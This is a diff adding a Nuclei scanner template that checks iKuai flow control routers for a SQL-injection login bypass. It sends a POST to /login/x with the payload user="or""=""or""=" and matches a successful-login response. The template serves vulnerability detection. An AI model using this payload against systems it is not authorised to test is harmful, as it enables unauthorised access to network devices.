@@ -1,0 +1,29 @@
+id: ikuai-flow-control-routing-sqli
+info:
+  name: iKuai Flow Control Routing SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /login/x HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user="or""=""or""="&pass=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"recode\":0"
+          - "\"error\":\"\u767b\u5f55\u6210\u529f\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
